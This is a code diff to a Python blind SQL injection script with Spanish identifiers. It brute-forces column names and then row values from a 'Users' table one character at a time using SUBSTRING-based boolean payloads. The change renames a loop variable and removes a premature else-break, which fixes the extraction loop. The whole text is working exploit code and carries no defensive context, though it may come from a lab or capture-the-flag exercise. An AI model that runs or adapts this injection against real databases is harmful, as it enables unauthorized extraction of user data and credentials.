@@ -15,7 +15,7 @@ def extrae_nombre_columnas(max_columns=10, max_len=20):
     for col_index in range(0, max_columns):
         name = ""
         for pos in range(1, max_len + 1):
-            for c in string.ascii_letters:
+            for letter in string.ascii_letters:
                 inyeccion = f"""
                 1 AND SUBSTRING(
                 (
@@ -26,10 +26,10 @@ def extrae_nombre_columnas(max_columns=10, max_len=20):
                     LIMIT {col_index},1
                 ),
                 {pos},1
-                ) = '{c}'
+                ) = '{letter}'
                 """
                 if condicion_logica(inyeccion):
-                    name += c
+                    name += letter
                     break
 
         if name:
@@ -46,7 +46,7 @@ def extrae_valor_columna(columna, max_rows=10, max_len=50):
     for row in range(0, max_rows):
         value = ""
         for pos in range(1, max_len + 1):
-            for c in string.printable:
+            for letter in string.printable:
                 inyeccion = f"""
                 1 AND LENGTH(
                     (SELECT {columna} FROM Users LIMIT {row},1)
@@ -54,13 +54,11 @@ def extrae_valor_columna(columna, max_rows=10, max_len=50):
                 AND SUBSTRING(
                     (SELECT {columna} FROM Users LIMIT {row},1),
                     {pos},1
-                ) = '{c}'
+                ) = '{letter}'
                 """
                 
                 if condicion_logica(inyeccion):
-                    value += c
-                    break
-                else:
+                    value += letter
                     break
 
         if value:
